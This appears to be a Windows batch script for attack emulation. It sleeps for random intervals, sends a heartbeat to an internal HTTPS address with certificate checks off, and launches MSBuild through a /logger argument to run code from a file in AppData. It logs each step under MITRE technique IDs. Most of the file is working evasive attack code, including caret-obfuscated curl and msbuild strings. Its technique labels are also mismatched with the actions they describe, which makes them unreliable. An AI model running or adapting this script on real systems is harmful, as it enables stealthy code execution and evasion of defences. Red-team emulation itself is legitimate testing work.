@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ constants (plain literals - NO obfuscation)
SET txisnba=%APPDATA%\8210\c20e9dc6
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?8210-7
SET jwcnifl=ITZEL-S2BO
SET rrocubc=7
SET xzanpex=control.txt
SET dvhhyc=8210

REM Script variables (random names)
SET lgpji=%APPDATA%\%rrocubc%\macula-simulations.log
SET kbrsyq=%RANDOM%

echo [%DATE% %TIME%][DEBUG][%jwcnifl%]: script_start>> "%lgpji%" 2>nul

REM Initial random delay (45-75s)
SET /A dl1=%kbrsyq% %% 31 + 45
echo [%DATE% %TIME%][DEBUG][%jwcnifl%]: initial_delay=!dl1!s>> "%lgpji%" 2>nul
timeout /t !dl1! /nobreak >nul

REM Heartbeat check with fixed curl implementation
echo [%DATE% %TIME%][DEBUG][%jwcnifl%]: heartbeat_check_start>> "%lgpji%" 2>nul

REM Simple caret escape for curl only - FIXED implementation
SET curlcmd=c^u^r^l
SET url=!keghkgto!

REM Execute curl with proper syntax
%curlcmd% -k -s -o nul "!url!"

IF !ERRORLEVEL! EQU 0 (
  SET hbresult=1
  SET hberror=
) ELSE (
  REM Retry once with different timeout
  echo [%DATE% %TIME%][DEBUG][%jwcnifl%]: heartbeat_retry>> "%lgpji%" 2>nul
  %curlcmd% -k -s -m 10 -o nul "!url!"
  IF !ERRORLEVEL! EQU 0 (
    SET hbresult=1
    SET hberror=
  ) ELSE (
    SET hbresult=0
    SET hberror=connection_failed
  )
)

echo [%DATE% %TIME%][DEBUG][%jwcnifl%]: heartbeat_result=!hbresult! error=!hberror!>> "%lgpji%" 2>nul

REM Log TTP for heartbeat check
SET _time=!TIME: =0!
SET _timestamp=!DATE:~6,4!-!DATE:~3,2!-!DATE:~0,2! !_time:~0,2!:!_time:~3,2!:!_time:~6,2!.!_time:~9,2!
echo [!_timestamp!][%jwcnifl%]: %rrocubc%-%dvhhyc%-T1218.001|MSBuild=!hbresult!:!hberror!>> "%lgpji%" 2>nul

REM Random delay 10-20s
SET /A dl2=%kbrsyq% %% 11 + 10
echo [%DATE% %TIME%][DEBUG][%jwcnifl%]: mid_delay=!dl2!s>> "%lgpji%" 2>nul
ping -n !dl2! 127.0.0.1 >nul

REM Prepare MSBuild command with heavy fragmentation
SET m1=m^s^b
SET m2=u^i^l^d^.
SET m3=e^x^e
SET l1=^/^l^o^g^g^e^r^:^L^o^g^g^e^r^E^n^t^r^y^,
SET l2=^;^M^y^P^a^r^a^m^e^t^e^r^s^,^F^o^o

REM Construct full command
SET vbsh=!m1!!m2!!m3!
SET rshg=!l1!!txisnba!\\!xzanpex!!l2!

echo [%DATE% %TIME%][DEBUG][%jwcnifl%]: msbuild_cmd=!vbsh! !rshg!>> "%lgpji%" 2>nul

REM Execute MSBuild
CALL !vbsh! !rshg!

REM Check result and log TTP
IF !ERRORLEVEL! EQU 0 (
  SET msresult=1
  SET mserror=
) ELSE (
  SET msresult=0
  SET mserror=msbuild_failed
)

SET _time=!TIME: =0!
SET _timestamp=!DATE:~6,4!-!DATE:~3,2!-!DATE:~0,2! !_time:~0,2!:!_time:~3,2!:!_time:~6,2!.!_time:~9,2!
echo [!_timestamp!][%jwcnifl%]: %rrocubc%-%dvhhyc%-T1218.002|Trusted Developer Utilities Proxy Execution=!msresult!:!mserror!>> "%lgpji%" 2>nul

REM Final delay 15-30s
SET /A dl3=%kbrsyq% %% 16 + 15
echo [%DATE% %TIME%][DEBUG][%jwcnifl%]: final_delay=!dl3!s>> "%lgpji%" 2>nul
CHOICE /C Y /N /D Y /T !dl3! >nul

echo [%DATE% %TIME%][DEBUG][%jwcnifl%]: script_complete>> "%lgpji%" 2>nul

ENDLOCAL